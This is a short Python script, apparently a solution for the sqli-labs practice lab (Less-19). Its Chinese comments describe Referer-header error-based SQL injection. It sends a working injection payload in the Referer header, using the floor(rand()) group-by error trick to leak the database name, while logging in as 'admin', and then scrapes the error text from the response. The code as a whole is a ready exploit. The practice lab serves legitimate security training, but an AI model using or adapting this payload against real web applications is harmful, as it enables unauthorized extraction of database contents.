# # -*- coding:utf-8 -*-

# ua报错注入，这道题需要知道账号密码

import requests
import string
import datetime
from bs4 import BeautifulSoup
import re

# 因为使用rand()所以要多试几次
header = {'referer':"zz' and (select 1 from(select count(*),concat(0x3a,0x3a,(select database()),0x3a,0x3a,floor(rand()*2)) as a from information_schema.columns group by a)b) and '1'='1"}

url = "http://127.0.0.1/sqli/Less-19/"

data = string.digits+string.lowercase

length = ""
def load(url):
    # global length
    # for j in range(1,10):
    #     for i in xrange(48,126):
    datas = {
            'uname':"admin",
            'passwd':"",
            'submit':'Submit'
    }
    # starttime = datetime.datetime.now()
    response = requests.post(url,headers=header,data=datas)
    # response=response.text
    # endtime = datetime.datetime.now()
    soup = BeautifulSoup(str(response.content),'lxml')
    r = soup.find_all(name='font',attrs={'size':3,'color':'#FFFF00'})
    for i in r:
        reg = re.compile(r'</font><br/>(.*?)<br/><br/><img src=')
        print re.findall(reg,str(i))

load (url)